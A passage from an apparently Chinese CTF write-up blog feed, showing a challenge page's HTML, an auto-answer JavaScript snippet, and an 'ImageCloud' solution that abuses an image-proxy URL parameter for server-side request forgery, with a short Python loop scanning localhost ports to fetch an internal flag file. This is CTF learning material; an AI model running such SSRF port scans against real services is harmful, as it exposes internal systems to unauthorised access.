attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>imgs<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/restart<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>div_restart<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>restart<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>按下按钮重新开始：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>restart<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>开始<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>/<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>player<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>请输入选手名字：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>player<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>player<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>direct<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>请回答问题：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>direct<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>direct<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>br</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>label</span> <span class="token attr-name">for</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>say<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>按下按钮回答：<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>label</span><span class="token punctuation">></span></span>      <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>button</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>say<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>回答<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>button</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>status<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>      4, 2    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span>  <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接写个<code>js</code>自动获取，本来想直接循环的，但是每次提交之后刚刚运行的<code>js</code>好像没了（？，直接<code>gpt</code>写了一段<code>js</code>然后多次运手动行</p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> directionMap <span class="token operator">=</span> <span class="token punctuation">&#123;</span>  <span class="token string-property property">'1'</span><span class="token operator">:</span> <span class="token string">'北'</span><span class="token punctuation">,</span>  <span class="token string-property property">'2'</span><span class="token operator">:</span> <span class="token string">'东北'</span><span class="token punctuation">,</span>  <span class="token string-property property">'3'</span><span class="token operator">:</span> <span class="token string">'东'</span><span class="token punctuation">,</span>  <span class="token string-property property">'4'</span><span class="token operator">:</span> <span class="token string">'东南'</span><span class="token punctuation">,</span>  <span class="token string-property property">'5'</span><span class="token operator">:</span> <span class="token string">'南'</span><span class="token punctuation">,</span>  <span class="token string-property property">'6'</span><span class="token operator">:</span> <span class="token string">'西南'</span><span class="token punctuation">,</span>  <span class="token string-property property">'7'</span><span class="token operator">:</span> <span class="token string">'西'</span><span class="token punctuation">,</span>  <span class="token string-property property">'8'</span><span class="token operator">:</span> <span class="token string">'西北'</span><span class="token punctuation">&#125;</span><span class="token punctuation">;</span><span class="token comment">// 定义一个函数来处理方向数字并生成答案</span><span class="token keyword">function</span> <span class="token function">handleDirections</span><span class="token punctuation">(</span><span class="token parameter">directions</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>  <span class="token keyword">let</span> answer <span class="token operator">=</span> <span class="token string">''</span><span class="token punctuation">;</span>  <span class="token keyword">const</span> directionArray <span class="token operator">=</span> directions<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">map</span><span class="token punctuation">(</span><span class="token parameter">direction</span> <span class="token operator">=></span> direction<span class="token punctuation">.</span><span class="token function">trim</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 去除空格</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span>directionArray<span class="token punctuation">.</span>length <span class="token operator">===</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 如果只有一个方向，直接输出</span>    answer <span class="token operator">=</span> directionMap<span class="token punctuation">[</span>directionArray<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'方'</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token comment">// 如果有多个方向，按照格式输出</span>    directionArray<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">direction<span class="token punctuation">,</span> index</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>      answer <span class="token operator">+=</span> directionMap<span class="token punctuation">[</span>direction<span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token string">'方一个'</span><span class="token punctuation">;</span>      <span class="token keyword">if</span> <span class="token punctuation">(</span>index <span class="token operator">&lt;</span> directionArray<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>        answer <span class="token operator">+=</span> <span class="token string">'，'</span><span class="token punctuation">;</span>      <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> answer<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token comment">// 获取当前页面的方向数字</span><span class="token keyword">const</span> directions <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'status'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>textContent<span class="token punctuation">;</span>console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'方向：'</span><span class="token punctuation">,</span> directions<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">const</span> answer <span class="token operator">=</span> <span class="token function">handleDirections</span><span class="token punctuation">(</span>directions<span class="token punctuation">)</span><span class="token punctuation">;</span>   console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">'自动生成的答案:'</span><span class="token punctuation">,</span> answer<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 如果你想自动填写到表单并提交，可以取消以下注释</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'player'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> <span class="token string">'test'</span><span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'direct'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value <span class="token operator">=</span> answer<span class="token punctuation">;</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">'submit'</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">submit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="ImageCloud"><a href="#ImageCloud" class="headerlink" title="ImageCloud"></a>ImageCloud</h3><p>给了源码，存在<code>static、uploads</code>两个文件夹和<code>app.py 、app1.py</code>两个<code>flask</code>源码，其中<code>app.py</code>端口在<code>5000</code>可以访问<code>static</code>，<code>app1.py</code>端口是随机的可以访问<code>uploads</code>，<code>flag.jpg</code>在<code>uploads</code>，但是直接访问题目运行的是<code>app.py</code>，通过<code>url/image?url=localhost:5000/static/filename</code>可以访问<code>app.py</code>上传上去在<code>static</code>中的图片，<code>app1.py</code>通过<code>localhost:port/image/filename</code>可以访问<code>uploads</code>中的图片，所以直接扫<code>5001-6000</code>的端口找出<code>app1.py</code>运行在哪直接访问<code>flag.jpg</code>获取<code>flag</code></p><pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">import</span> requests<span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token function">range</span><span class="token punctuation">(</span><span class="token number">5000</span><span class="token punctuation">,</span> <span class="token number">6001</span><span class="token punctuation">)</span><span class="token operator">:</span>    url <span class="token operator">=</span> <span class="token string">'http://192.168.56.1:55956/image?url=http://localhost:'</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'/image/flag.jpg'</span>    <span class="token function">print</span><span class="token punctuation">(</span><span class="token string">'port = '</span> <span class="token operator">+</span> <span class="token function">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">'\nres = '</span> <span class="token operator">+</span> requests<span class="token punctuation">.</span><span class="token function">get</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> timeout<span class="token operator">=</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">.</span>text <span class="token operator">+</span> <span class="token string">'\n'</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;7-5&quot;&gt;&lt;a href=&quot;#7-5&quot; class=&quot;headerlink&quot; title=&quot;#7.5&quot;&gt;&lt;/a&gt;#7.5&lt;/h2&gt;&lt;p&gt;早上和晚上在打春秋杯夏季赛，下午被摇过去改论文，春秋杯打完就不打算打比赛啦，留时间把没完成的事完成一下，然后跟着学长一起复现&lt;/</summary>
      
    
    
    
    <category term="学习记录" scheme="https://starrysky1004.github.io/categories/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
    
    <category term="学习记录" scheme="https://starrysky1004.github.io/tags/%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/"/>
    
  </entry>
  
</feed>
